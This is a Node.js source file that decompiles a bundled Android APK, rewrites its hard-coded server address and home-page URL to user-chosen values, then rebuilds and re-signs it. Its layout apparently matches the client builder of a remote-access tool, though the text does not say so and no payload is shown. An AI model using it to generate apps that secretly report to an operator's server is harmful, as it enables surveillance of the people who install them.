const cp = require('child_process');
const fs = require('fs');
const path = require('path');
const config = require('./config');

// core paths
const progressFile = path.join(config.dbPath, 'build_progress.json');
const apkToolPath = path.join(__dirname, '../app/factory/apktool.jar');
const signerPath = path.join(__dirname, '../app/factory/uber-apk-signer.jar');
const rawApkPath = path.join(__dirname, '../app/factory/rawapk/app-debug.apk');
const decompilePath = path.join(__dirname, '../app/factory/decompiled');
const builtApkPath = path.join(config.dbPath, 'built_apks');
const outputApk = path.join(builtApkPath, 'build.apk');
const signedApk = path.join(builtApkPath, 'build.s.apk');

// default placeholders
const DEFAULT_SERVER_URL = 'http://127.0.0.1:22533';
const DEFAULT_HOME_PAGE = 'https://google.com';

// ensure output dir
if (!fs.existsSync(builtApkPath)) {
    fs.mkdirSync(builtApkPath, { recursive: true });
}

// progress writer
function progress(step, message, complete = false) {
    try {
        fs.writeFileSync(progressFile, JSON.stringify({
            step,
            message,
            complete,
            time: new Date().toISOString()
        }));
    } catch {}
    console.log(`[BUILD] ${step}: ${message}`);
}

// get progress
function getProgress() {
    try {
        if (fs.existsSync(progressFile)) {
            return JSON.parse(fs.readFileSync(progressFile, 'utf8'));
        }
    } catch {}
    return { step: 'idle', message: 'Ready', complete: false };
}

// check java
function checkJava(cb) {
    progress('java', 'Checking Java...');
    const proc = cp.spawn('java', ['-version']);
    let output = '';

    proc.stderr.on('data', d => output += d.toString());
    proc.on('error', () => cb('Java not found. Install Java 8+'));
    proc.on('close', () => {
        if (output.includes('version')) {
            progress('java', 'Java detected', true);
            cb(null);
        } else {
            cb('Java not detected');
        }
    });
}

// clean workspace
function cleanWorkspace() {
    try {
        if (fs.existsSync(decompilePath)) {
            fs.rmSync(decompilePath, { recursive: true, force: true });
        }
        fs.mkdirSync(decompilePath, { recursive: true });
        return null;
    } catch (e) {
        return e.message;
    }
}

// decompile apk
function decompile(cb) {
    progress('decompile', 'Preparing workspace...');
    const err = cleanWorkspace();
    if (err) return cb(err);

    if (!fs.existsSync(rawApkPath)) {
        return cb('Raw APK not found');
    }

    progress('decompile', 'Decompiling APK...');
    const cmd = `java -jar "${apkToolPath}" d "${rawApkPath}" -o "${decompilePath}" -f`;

    cp.exec(cmd, (error) => {
        if (error) return cb('Decompile failed: ' + error.message);
        progress('decompile', 'Decompiled successfully', true);
        cb(null);
    });
}

// get smali dirs
function getSmaliDirs() {
    if (!fs.existsSync(decompilePath)) return [];
    return fs.readdirSync(decompilePath)
        .filter(d => d.startsWith('smali'))
        .map(d => path.join(decompilePath, d));
}

// recursive smali scan
function scanSmali(dir) {
    let results = [];
    fs.readdirSync(dir).forEach(file => {
        const filePath = path.join(dir, file);
        const stat = fs.statSync(filePath);
        if (stat.isDirectory()) {
            results = results.concat(scanSmali(filePath));
        } else if (file.endsWith('.smali')) {
            results.push(filePath);
        }
    });
    return results;
}

// escape regex
function escapeRegex(str) {
    return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

// normalize url
function normalizeUrl(url, fallbackProtocol) {
    if (!url) return null;
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
        return fallbackProtocol + url;
    }
    return url;
}

// patch logic
function patch(serverUrl, homePageUrl, cb) {
    progress('patch', 'Scanning smali files...');

    const newServer = normalizeUrl(serverUrl, 'http://');
    const newHome = normalizeUrl(homePageUrl || DEFAULT_HOME_PAGE, 'https://');

    const smaliDirs = getSmaliDirs();
    if (!smaliDirs.length) return cb('No smali directories found');

    let serverCount = 0;
    let homeCount = 0;

    try {
        smaliDirs.forEach(dir => {
            const files = scanSmali(dir);

            files.forEach(file => {
                let data = fs.readFileSync(file, 'utf8');
                let modified = false;

                const replacements = [
                    { from: DEFAULT_SERVER_URL, to: newServer, counter: () => serverCount++ },
                    { from: DEFAULT_HOME_PAGE, to: newHome, counter: () => homeCount++ }
                ];

                replacements.forEach(r => {
                    const regex = new RegExp(escapeRegex(r.from), 'g');
                    if (regex.test(data)) {
                        data = data.replace(regex, r.to);
                        modified = true;
                        r.counter();
                    }
                });

                if (modified) {
                    fs.writeFileSync(file, data, 'utf8');
                }
            });
        });

        if (serverCount === 0) {
            return cb('Server URL not found to patch');
        }

        progress('patch', `Patched server: ${serverCount}, home: ${homeCount}`, true);
        cb(null);

    } catch (e) {
        cb('Patch failed: ' + e.message);
    }
}

// build apk
function build(cb) {
    progress('build', 'Building APK...');
    const cmd = `java -jar "${apkToolPath}" b "${decompilePath}" -o "${outputApk}"`;

    cp.exec(cmd, (error) => {
        if (error) return cb('Build failed: ' + error.message);
        progress('build', 'Build successful', true);
        cb(null);
    });
}

// sign apk
function sign(cb) {
    progress('sign', 'Signing APK...');
    const cmd = `java -jar "${signerPath}" --apks "${outputApk}" --overwrite`;

    cp.exec(cmd, (error) => {
        if (error) return cb('Signing failed: ' + error.message);

        try {
            fs.copyFileSync(outputApk, signedApk);
        } catch (e) {
            return cb('Copy failed: ' + e.message);
        }

        progress('sign', 'Signed successfully', true);
        cb(null);
    });
}

// cleanup
function cleanup() {
    progress('cleanup', 'Cleaning files...');
    cleanWorkspace();
    progress('cleanup', 'Done', true);
}

// main build flow
function buildApk(serverUrl, homePageUrl, cb) {
    if (!serverUrl) return cb('Server URL required');

    const normalized = normalizeUrl(serverUrl, 'http://');

    try {
        const urlObj = new URL(normalized);
        if (!urlObj.hostname) return cb('Invalid server URL');
    } catch {
        return cb('Invalid server URL format');
    }

    checkJava(err => {
        if (err) return cb(err);

        decompile(err => {
            if (err) return cb(err);

            patch(serverUrl, homePageUrl, err => {
                if (err) return cb(err);

                build(err => {
                    if (err) return cb(err);

                    sign(err => {
                        if (err) return cb(err);

                        cleanup();
                        progress('done', 'Build completed!', true);
                        cb(null);
                    });
                });
            });
        });
    });
}

module.exports = { buildApk, getProgress, signedApk };